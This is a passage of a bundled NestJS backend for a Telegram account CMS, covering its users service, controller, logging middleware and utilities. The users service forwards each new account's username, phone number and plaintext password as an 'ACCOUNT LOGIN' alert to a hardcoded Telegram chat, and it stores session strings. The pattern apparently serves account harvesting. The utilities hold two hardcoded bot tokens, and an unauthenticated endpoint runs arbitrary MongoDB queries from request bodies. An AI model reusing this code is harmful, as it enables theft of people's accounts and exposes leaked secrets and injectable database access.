    __metadata("design:returntype", Promise)
], UsersController.prototype, "findAll", null);
__decorate([
    (0, common_1.Get)(':tgId'),
    (0, swagger_1.ApiOperation)({ summary: 'Get a user by tgId' }),
    (0, swagger_1.ApiParam)({ name: 'tgId', description: 'The Telegram ID of the user', type: String }),
    __param(0, (0, common_1.Param)('tgId')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], UsersController.prototype, "findOne", null);
__decorate([
    (0, common_1.Patch)(':tgId'),
    (0, swagger_1.ApiOperation)({ summary: 'Update a user by tgId' }),
    (0, swagger_1.ApiParam)({ name: 'tgId', description: 'The Telegram ID of the user', type: String }),
    __param(0, (0, common_1.Param)('tgId')),
    __param(1, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, update_user_dto_1.UpdateUserDto]),
    __metadata("design:returntype", Promise)
], UsersController.prototype, "update", null);
__decorate([
    (0, common_1.Delete)(':tgId'),
    (0, swagger_1.ApiOperation)({ summary: 'Delete a user by tgId' }),
    (0, swagger_1.ApiParam)({ name: 'tgId', description: 'The Telegram ID of the user', type: String }),
    __param(0, (0, common_1.Param)('tgId')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], UsersController.prototype, "remove", null);
__decorate([
    (0, common_1.Post)('query'),
    (0, swagger_1.ApiOperation)({ summary: 'Execute a custom MongoDB query' }),
    __param(0, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [Object]),
    __metadata("design:returntype", Promise)
], UsersController.prototype, "executeQuery", null);
exports.UsersController = UsersController = __decorate([
    (0, swagger_1.ApiTags)('Telegram Users'),
    (0, common_1.Controller)('user'),
    __metadata("design:paramtypes", [users_service_1.UsersService])
], UsersController);


/***/ }),

/***/ "./src/components/users/users.module.ts":
/*!**********************************************!*\
  !*** ./src/components/users/users.module.ts ***!
  \**********************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.UsersModule = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const users_service_1 = __webpack_require__(/*! ./users.service */ "./src/components/users/users.service.ts");
const users_controller_1 = __webpack_require__(/*! ./users.controller */ "./src/components/users/users.controller.ts");
const user_schema_1 = __webpack_require__(/*! ./schemas/user.schema */ "./src/components/users/schemas/user.schema.ts");
const Telegram_module_1 = __webpack_require__(/*! ../Telegram/Telegram.module */ "./src/components/Telegram/Telegram.module.ts");
const client_module_1 = __webpack_require__(/*! ../clients/client.module */ "./src/components/clients/client.module.ts");
const init_module_1 = __webpack_require__(/*! ../ConfigurationInit/init.module */ "./src/components/ConfigurationInit/init.module.ts");
let UsersModule = class UsersModule {
};
exports.UsersModule = UsersModule;
exports.UsersModule = UsersModule = __decorate([
    (0, common_1.Module)({
        imports: [
            init_module_1.initModule,
            mongoose_1.MongooseModule.forFeature([{ name: 'userModule', schema: user_schema_1.UserSchema, collection: 'users' }]),
            (0, common_1.forwardRef)(() => Telegram_module_1.TelegramModule),
            (0, common_1.forwardRef)(() => client_module_1.ClientModule)
        ],
        controllers: [users_controller_1.UsersController],
        providers: [users_service_1.UsersService],
        exports: [users_service_1.UsersService]
    })
], UsersModule);


/***/ }),

/***/ "./src/components/users/users.service.ts":
/*!***********************************************!*\
  !*** ./src/components/users/users.service.ts ***!
  \***********************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.UsersService = void 0;
const Telegram_service_1 = __webpack_require__(/*! ./../Telegram/Telegram.service */ "./src/components/Telegram/Telegram.service.ts");
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const mongoose_2 = __webpack_require__(/*! mongoose */ "mongoose");
const client_service_1 = __webpack_require__(/*! ../clients/client.service */ "./src/components/clients/client.service.ts");
const utils_1 = __webpack_require__(/*! ../../utils */ "./src/utils.ts");
let UsersService = class UsersService {
    constructor(userModel, telegramService, clientsService) {
        this.userModel = userModel;
        this.telegramService = telegramService;
        this.clientsService = clientsService;
    }
    async create(user) {
        const activeClientSetup = this.telegramService.getActiveClientSetup();
        console.log("New User received - ", user?.mobile);
        console.log("ActiveClientSetup::", activeClientSetup);
        if (activeClientSetup && activeClientSetup.newMobile === user.mobile) {
            console.log("Updating New Session Details", user.mobile, user.username, activeClientSetup.clientId);
            await this.clientsService.updateClientSession(user.session);
        }
        else {
            await (0, utils_1.fetchWithTimeout)(`${(0, utils_1.ppplbot)()}&text=${encodeURIComponent(`ACCOUNT LOGIN: ${user.username ? `@${user.username}` : user.firstName}\nMobile: t.me/${user.mobile}${user.password ? `\npassword: ${user.password}` : "\n"}`)}`);
            const newUser = new this.userModel(user);
            return newUser.save();
        }
    }
    async findAll() {
        return this.userModel.find().exec();
    }
    async findOne(tgId) {
        const user = await (await this.userModel.findOne({ tgId }).exec())?.toJSON();
        if (!user) {
            throw new common_1.NotFoundException(`User with tgId ${tgId} not found`);
        }
        return user;
    }
    async update(tgId, user) {
        delete user['_id'];
        const result = await this.userModel.updateMany({ tgId }, { $set: user }, { new: true, upsert: true }).exec();
        if (result.matchedCount === 0) {
            throw new common_1.NotFoundException(`Users with tgId ${tgId} not found`);
        }
        return result.modifiedCount;
    }
    async updateByFilter(filter, user) {
        delete user['_id'];
        const result = await this.userModel.updateMany(filter, { $set: user }, { new: true, upsert: true }).exec();
        if (result.matchedCount === 0) {
            throw new common_1.NotFoundException(`Users with tgId ${JSON.stringify(filter)} not found`);
        }
        return result.modifiedCount;
    }
    async delete(tgId) {
        const result = await this.userModel.deleteOne({ tgId }).exec();
        if (result.deletedCount === 0) {
            throw new common_1.NotFoundException(`User with tgId ${tgId} not found`);
        }
    }
    async search(filter) {
        if (filter.firstName) {
            filter.firstName = { $regex: new RegExp(filter.firstName, 'i') };
        }
        if (filter.twoFA !== undefined) {
            filter.twoFA = filter.twoFA === 'true' || filter.twoFA === '1' || filter.twoFA === true;
        }
        console.log(filter);
        return this.userModel.find(filter).sort({ updatedAt: -1 }).exec();
    }
    async executeQuery(query, sort, limit, skip) {
        try {
            if (!query) {
                throw new common_1.BadRequestException('Query is invalid.');
            }
            const queryExec = this.userModel.find(query);
            if (sort) {
                queryExec.sort(sort);
            }
            if (limit) {
                queryExec.limit(limit);
            }
            if (skip) {
                queryExec.skip(skip);
            }
            return await queryExec.exec();
        }
        catch (error) {
            throw new common_1.InternalServerErrorException(error.message);
        }
    }
};
exports.UsersService = UsersService;
exports.UsersService = UsersService = __decorate([
    (0, common_1.Injectable)(),
    __param(0, (0, mongoose_1.InjectModel)('userModule')),
    __param(1, (0, common_1.Inject)((0, common_1.forwardRef)(() => Telegram_service_1.TelegramService))),
    __param(2, (0, common_1.Inject)((0, common_1.forwardRef)(() => client_service_1.ClientService))),
    __metadata("design:paramtypes", [mongoose_2.Model,
        Telegram_service_1.TelegramService,
        client_service_1.ClientService])
], UsersService);


/***/ }),

/***/ "./src/main.ts":
/*!*********************!*\
  !*** ./src/main.ts ***!
  \*********************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
const core_1 = __webpack_require__(/*! @nestjs/core */ "@nestjs/core");
const mongoose_1 = __importDefault(__webpack_require__(/*! mongoose */ "mongoose"));
const app_module_1 = __webpack_require__(/*! ./app.module */ "./src/app.module.ts");
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
async function bootstrap() {
    const app = await core_1.NestFactory.create(app_module_1.AppModule);
    const config = new swagger_1.DocumentBuilder()
        .setTitle('NestJS and Express API')
        .setDescription('API documentation')
        .setVersion('1.0')
        .build();
    app.use((req, res, next) => {
        res.header('Access-Control-Allow-Origin', '*');
        res.header('Access-Control-Allow-Methods', 'GET,PUT,POST,DELETE');
        res.header('Access-Control-Allow-Headers', 'Content-Type, Accept');
        next();
    });
    app.enableCors({
        allowedHeaders: "*",
        origin: "*"
    });
    const document = swagger_1.SwaggerModule.createDocument(app, config);
    swagger_1.SwaggerModule.setup('api', app, document);
    mongoose_1.default.set('debug', true);
    app.useGlobalPipes(new common_1.ValidationPipe({
        transform: true,
    }));
    process.on('unhandledRejection', (reason, promise) => {
        console.error('Unhandled Rejection at:', promise, 'reason:', reason);
    });
    process.on('uncaughtException', (reason, promise) => {
        console.error(promise, reason);
    });
    let isShuttingDown = false;
    const shutdown = async (signal) => {
        if (isShuttingDown)
            return;
        isShuttingDown = true;
        console.log(`${signal} received`);
        await app.close();
        process.exit(0);
    };
    process.on('exit', async () => {
        console.log('Application closed');
    });
    process.on('SIGINT', async () => {
        await shutdown('SIGINT');
    });
    process.on('SIGTERM', async () => {
        await shutdown('SIGTERM');
    });
    process.on('SIGQUIT', async () => {
        await shutdown('SIGQUIT');
    });
    await app.init();
    await app.listen(8000);
}
bootstrap();


/***/ }),

/***/ "./src/middlewares/logger.middleware.ts":
/*!**********************************************!*\
  !*** ./src/middlewares/logger.middleware.ts ***!
  \**********************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.LoggerMiddleware = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const utils_1 = __webpack_require__(/*! ../utils */ "./src/utils.ts");
let LoggerMiddleware = class LoggerMiddleware {
    constructor() {
        this.logger = new common_1.Logger('HTTP');
    }
    use(req, res, next) {
        const { method, originalUrl, baseUrl } = req;
        const userAgent = req.get('user-agent') || '';
        const ip = req.ip;
        const excludedEndpoints = ['/sendtochannel', '/favicon.', '/tgsignup'];
        const isExcluded = (url) => excludedEndpoints.some(endpoint => url.startsWith(endpoint));
        if (!isExcluded(originalUrl) && originalUrl !== '/') {
            res.on('finish', () => {
                const { statusCode } = res;
                const contentLength = res.get('content-length');
                if (statusCode >= 500) {
                    (0, utils_1.fetchWithTimeout)(`${(0, utils_1.ppplbot)()}&text=${encodeURIComponent(`Failed :: ${originalUrl} with ${statusCode}`)}`);
                    this.logger.error(`${method} ${originalUrl} ${req.ip} || StatusCode : ${statusCode}`);
                }
                else if (statusCode >= 400) {
                    (0, utils_1.fetchWithTimeout)(`${(0, utils_1.ppplbot)()}&text=${encodeURIComponent(`Failed :: ${originalUrl} with ${statusCode}`)}`);
                    this.logger.warn(`${method} ${originalUrl} ${req.ip} || StatusCode : ${statusCode}`);
                }
                else if (statusCode >= 300) {
                    this.logger.verbose(`${method} ${originalUrl} ${req.ip} || StatusCode : ${statusCode}`);
                }
                else {
                    this.logger.log(`${method} ${originalUrl} ${req.ip} || StatusCode : ${statusCode}`);
                }
            });
            res.on('error', (error) => {
                const errorDetails = (0, utils_1.parseError)(error, process.env.clientId);
                (0, utils_1.fetchWithTimeout)(`${(0, utils_1.ppplbot)()}&text=${encodeURIComponent(`Failed :: ${originalUrl} with ${errorDetails.message}`)}`);
            });
        }
        else {
            if (originalUrl.includes('Video')) {
                this.logger.log(`Excluded endpoint hit: ${originalUrl} (length: ${originalUrl.length})`);
            }
        }
        next();
    }
};
exports.LoggerMiddleware = LoggerMiddleware;
exports.LoggerMiddleware = LoggerMiddleware = __decorate([
    (0, common_1.Injectable)()
], LoggerMiddleware);


/***/ }),

/***/ "./src/utils.ts":
/*!**********************!*\
  !*** ./src/utils.ts ***!
  \**********************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.defaultMessages = exports.defaultReactions = void 0;
exports.sleep = sleep;
exports.contains = contains;
exports.fetchWithTimeout = fetchWithTimeout;
exports.toBoolean = toBoolean;
exports.fetchNumbersFromString = fetchNumbersFromString;
exports.parseError = parseError;
exports.ppplbot = ppplbot;
exports.areJsonsNotSame = areJsonsNotSame;
exports.mapToJson = mapToJson;
const axios_1 = __importDefault(__webpack_require__(/*! axios */ "axios"));
function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}
function contains(str, arr) {
    return (arr.some(element => {
        if (str?.includes(element)) {
            return true;
        }
        return false;
    }));
}
;
async function fetchWithTimeout(resource, options = {}, maxRetries = 1) {
    options.timeout = options.timeout || 50000;
    options.method = options.method || 'GET';
    const fetchWithProtocol = async (url, version) => {
        const source = axios_1.default.CancelToken.source();
        const id = setTimeout(() => {
            source.cancel(`Request timed out after ${options.timeout}ms`);
        }, options.timeout);
        try {
            const response = await (0, axios_1.default)({
                ...options,
                url,
                headers: { 'Content-Type': 'application/json' },
                cancelToken: source.token,
                family: version
            });
            clearTimeout(id);
            return response;
        }
        catch (error) {
            clearTimeout(id);
            console.log(`Error at URL (IPv${version}): `, url);
            parseError(error);
            if (axios_1.default.isCancel(error)) {
                console.log('Request canceled:', error.message, url);
                return undefined;
            }
            throw error;
        }
    };
    for (let retryCount = 0; retryCount <= maxRetries; retryCount++) {
        try {
            const responseIPv4 = await fetchWithProtocol(resource, 4);
            if (responseIPv4)
                return responseIPv4;
            const responseIPv6 = await fetchWithProtocol(resource, 6);
            if (responseIPv6)
                return responseIPv6;
        }
        catch (error) {
            console.log("Error at URL : ", resource);
            const errorDetails = parseError(error);
            if (retryCount < maxRetries && error.code !== 'ERR_NETWORK' && error.code !== "ECONNABORTED" && error.code !== "ETIMEDOUT" && !errorDetails.message.toLowerCase().includes('too many requests') && !axios_1.default.isCancel(error)) {
                console.log(`Retrying... (${retryCount + 1}/${maxRetries})`);
                await new Promise(resolve => setTimeout(resolve, 2000));
            }
            else {
                console.log(`All ${maxRetries + 1} retries failed for ${resource}`);
                return undefined;
            }
        }
    }
}
function toBoolean(value) {
    if (typeof value === 'string') {
        return value.toLowerCase() === 'true';
    }
    if (typeof value === 'number') {
        return value === 1;
    }
    return value;
}
function fetchNumbersFromString(inputString) {
    const regex = /\d+/g;
    const matches = inputString.match(regex);
    if (matches) {
        const result = matches.join('');
        return result;
    }
    else {
        return '';
    }
}
function parseError(err, prefix = 'TgCms') {
    let status = 'UNKNOWN';
    let message = 'An unknown error occurred';
    let error = 'UnknownError';
    const extractMessage = (data) => {
        if (Array.isArray(data)) {
            const messages = data.map((item) => extractMessage(item));
            return messages.filter((message) => message !== undefined).join(', ');
        }
        else if (typeof data === 'string') {
            return data;
        }
        else if (typeof data === 'object' && data !== null) {
            let resultString = '';
            for (const key in data) {
                const value = data[key];
                if (Array.isArray(data[key]) && data[key].every(item => typeof item === 'string')) {
                    resultString = resultString + data[key].join(', ');
                }
                else {
                    const result = extractMessage(value);
                    if (result) {
                        resultString = resultString + result;
                    }
                }
            }
            return resultString;
        }
        return JSON.stringify(data);
    };
    if (err.response) {
        const response = err.response;
        status =
            response.data?.status ||
                response.status ||
                err.status ||
                'UNKNOWN';
        message =
            response.data?.message ||
                response.data?.errors ||
                response.errorMessage ||
                response.message ||
                response.statusText ||
                response.data ||
                err.message ||
                'An error occurred';
        error =
            response.data?.error ||
                response.error ||
                err.name ||
                err.code ||
                'Error';
    }
    else if (err.request) {
        status = err.status || 'NO_RESPONSE';
        message = err.data?.message ||
            err.data?.errors ||
            err.message ||
            err.statusText ||
            err.data ||
            err.message || 'The request was triggered but no response was received';
        error = err.name || err.code || 'NoResponseError';
    }
    else if (err.message) {
        status = err.status || 'UNKNOWN';
        message = err.message;
        error = err.name || err.code || 'Error';
    }
    else if (err.errorMessage) {
        status = err.status || 'UNKNOWN';
        message = err.errorMessage;
        error = err.name || err.code || 'Error';
    }
    const msg = `${prefix ? `${prefix} ::` : ""} ${extractMessage(message)} `;
    const resp = { status, message: err.errorMessage || msg, error };
    console.log(resp.error == 'RPCError' ? resp.message : resp);
    return resp;
}
let botCount = 0;
function ppplbot(chatId, botToken) {
    let token = botToken;
    if (!token) {
        if (botCount % 2 === 1) {
            token = 'bot6624618034:AAHoM3GYaw3_uRadOWYzT7c2OEp6a7A61mY';
        }
        else {
            token = 'bot6607225097:AAG6DJg9Ll5XVxy24Nr449LTZgRb5bgshUA';
        }
        botCount++;
    }
    const targetChatId = chatId || '-1001801844217';
    const apiUrl = `https://api.telegram.org/${token}/sendMessage?chat_id=${targetChatId}`;
    return apiUrl;
}
;
exports.defaultReactions = [
    '❤', '🔥', '👏', '🥰', '😁', '🤔',
    '🤯', '😱', '🤬', '😢', '🎉', '🤩',
    '🤮', '💩', '🙏', '👌', '🕊', '🤡',
    '🥱', '🥴', '😍', '🐳', '❤‍🔥', '💯',
    '🤣', '💔', '🏆', '😭', '😴', '👍',
    '🌚', '⚡', '🍌', '😐', '💋', '👻',
    '👀', '🙈', '🤝', '🤗', '🆒',
    '🗿', '🙉', '🙊', '🤷', '👎'
];
exports.defaultMessages = [
    "1", "2", "3", "4", "5", "6", "7", "8",
    "9", "10", "11", "12", "13", "14", "15",
    "16", "17", "18", "19", "20", "21"
];
function areJsonsNotSame(json1, json2) {
    const keysToIgnore = ["id", "_id"];
    function deepCompare(obj1, obj2) {
        if (obj1 === obj2)
            return true;
        if (typeof obj1 !== "object" || typeof obj2 !== "object" || obj1 === null || obj2 === null) {
            return false;
        }
        const keys1 = Object.keys(obj1).filter(key => !keysToIgnore.includes(key)).sort();
        const keys2 = Object.keys(obj2).filter(key => !keysToIgnore.includes(key)).sort();
        if (keys1.length !== keys2.length)
            return false;
        return keys1.every(key => deepCompare(obj1[key], obj2[key]));
    }
    return !deepCompare(json1, json2);
}
function mapToJson(map) {
    const obj = {};
    for (const [key, value] of map.entries()) {
        obj[String(key)] = value;
    }
    return obj;
}


/***/ }),

/***/ "@nestjs/common":
/*!*********************************!*\
  !*** external "@nestjs/common" ***!
  \*********************************/
/***/ ((module) => {

module.exports = require("@nestjs/common");

/***/ }),

/***/ "@nestjs/config":
/*!*********************************!*\
  !*** external "@nestjs/config" ***!
  \*********************************/
/***/ ((module) => {

module.exports = require("@nestjs/config");

/***/ }),

/***/ "@nestjs/core":
/*!*******************************!*\
  !*** external "@nestjs/core" ***!
  \*******************************/
/***/ ((module) => {

module.exports = require("@nestjs/core");

/***/ }),

/***/ "@nestjs/mapped-types":
/*!***************************************!*\
  !*** external "@nestjs/mapped-types" ***!
  \***************************************/
/***/ ((module) => {

module.exports = require("@nestjs/mapped-types");

/***/ }),

/***/ "@nestjs/mongoose":
/*!***********************************!*\
  !*** external "@nestjs/mongoose" ***!
  \***********************************/
/***/ ((module) => {

module.exports = require("@nestjs/mongoose");

/***/ }),

/***/ "@nestjs/platform-express":
/*!*******************************************!*\
  !*** external "@nestjs/platform-express" ***!
  \*******************************************/
/***/ ((module) => {

module.exports = require("@nestjs/platform-express");

/***/ }),

/***/ "@nestjs/swagger":
/*!**********************************!*\
  !*** external "@nestjs/swagger" ***!
  \**********************************/
/***/ ((module) => {

module.exports = require("@nestjs/swagger");

/***/ }),

/***/ "adm-zip":
/*!**************************!*\
  !*** external "adm-zip" ***!
  \**************************/
/***/ ((module) => {

module.exports = require("adm-zip");

/***/ }),

/***/ "axios":
/*!************************!*\
  !*** external "axios" ***!
  \************************/
/***/ ((module) => {

module.exports = require("axios");

/***/ }),

/***/ "big-integer":
/*!******************************!*\
  !*** external "big-integer" ***!
  \******************************/
/***/ ((module) => {

module.exports = require("big-integer");

/***/ }),

/***/ "class-transformer":
/*!************************************!*\
  !*** external "class-transformer" ***!
  \************************************/
/***/ ((module) => {

module.exports = require("class-transformer");

/***/ }),

/***/ "class-validator":
/*!**********************************!*\
  !*** external "class-validator" ***!
  \**********************************/
/***/ ((module) => {

module.exports = require("class-validator");

/***/ }),

/***/ "cloudinary":
/*!*****************************!*\
  !*** external "cloudinary" ***!
  \*****************************/
/***/ ((module) => {

module.exports = require("cloudinary");

/***/ }),

/***/ "imap":
/*!***********************!*\
  !*** external "imap" ***!
  \***********************/
/***/ ((module) => {

module.exports = require("imap");

/***/ }),

/***/ "mongoose":
/*!***************************!*\
  !*** external "mongoose" ***!
  \***************************/
/***/ ((module) => {

module.exports = require("mongoose");

/***/ }),

/***/ "multer":
/*!*************************!*\
  !*** external "multer" ***!
  \*************************/
/***/ ((module) => {

module.exports = require("multer");

/***/ }),

/***/ "telegram":
/*!***************************!*\
  !*** external "telegram" ***!
  \***************************/
/***/ ((module) => {

module.exports = require("telegram");

/***/ }),

/***/ "telegram/Helpers":
/*!***********************************!*\
  !*** external "telegram/Helpers" ***!
  \***********************************/
/***/ ((module) => {

module.exports = require("telegram/Helpers");

/***/ }),

/***/ "telegram/Password":
/*!************************************!*\
  !*** external "telegram/Password" ***!
  \************************************/
/***/ ((module) => {

module.exports = require("telegram/Password");

/***/ }),

/***/ "telegram/client/uploads":
/*!******************************************!*\
  !*** external "telegram/client/uploads" ***!
  \******************************************/
/***/ ((module) => {

module.exports = require("telegram/client/uploads");

/***/ }),

/***/ "telegram/events":
/*!**********************************!*\
  !*** external "telegram/events" ***!
  \**********************************/
/***/ ((module) => {

module.exports = require("telegram/events");

/***/ }),

/***/ "telegram/extensions/Logger":
/*!*********************************************!*\
  !*** external "telegram/extensions/Logger" ***!
  \*********************************************/
/***/ ((module) => {

module.exports = require("telegram/extensions/Logger");

/***/ }),

/***/ "telegram/sessions":
/*!************************************!*\
  !*** external "telegram/sessions" ***!
  \************************************/
/***/ ((module) => {

module.exports = require("telegram/sessions");

/***/ }),

/***/ "telegram/tl":
/*!******************************!*\
  !*** external "telegram/tl" ***!
  \******************************/
/***/ ((module) => {

module.exports = require("telegram/tl");

/***/ }),

/***/ "fs":
/*!*********************!*\
  !*** external "fs" ***!
  \*********************/
/***/ ((module) => {

module.exports = require("fs");

/***/ }),

/***/ "path":
/*!***********************!*\
  !*** external "path" ***!
  \***********************/
/***/ ((module) => {

module.exports = require("path");

/***/ })

/******/ 	});
/************************************************************************/
/******/ 	// The module cache
/******/ 	var __webpack_module_cache__ = {};
/******/ 	
/******/ 	// The require function
/******/ 	function __webpack_require__(moduleId) {
/******/ 		// Check if module is in cache
/******/ 		var cachedModule = __webpack_module_cache__[moduleId];
/******/ 		if (cachedModule !== undefined) {
/******/ 			return cachedModule.exports;
/******/ 		}
/******/ 		// Create a new module (and put it into the cache)
/******/ 		var module = __webpack_module_cache__[moduleId] = {
/******/ 			// no module.id needed
/******/ 			// no module.loaded needed
/******/ 			exports: {}
/******/ 		};
/******/ 	
/******/ 		// Execute the module function
/******/ 		__webpack_modules__[moduleId].call(module.exports, module, module.exports, __webpack_require__);
/******/ 	
/******/ 		// Return the exports of the module
/******/ 		return module.exports;
/******/ 	}
/******/ 	
/************************************************************************/
/******/ 	
/******/ 	// startup
/******/ 	// Load entry module and return exports
/******/ 	// This entry module is referenced by other modules so it can't be inlined
/******/ 	var __webpack_exports__ = __webpack_require__("./src/main.ts");
/******/ 	var __webpack_export_target__ = exports;
/******/ 	for(var __webpack_i__ in __webpack_exports__) __webpack_export_target__[__webpack_i__] = __webpack_exports__[__webpack_i__];
/******/ 	if(__webpack_exports__.__esModule) Object.defineProperty(__webpack_export_target__, "__esModule", { value: true });
/******/ 	
/******/ })()
;
//# sourceMappingURL=index.js.map